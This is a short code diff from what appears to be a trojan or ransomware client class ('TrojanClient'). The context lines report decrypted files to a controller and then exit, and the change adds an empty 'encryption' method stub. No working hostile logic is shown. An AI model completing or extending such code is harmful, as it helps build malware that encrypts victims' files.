@@ -164,6 +164,8 @@ class TrojanClient:
         protocol.send(self.connection, "the files are decrypted")
         
         sys.exit()
+        
+    def encryption(self):
 
 
 
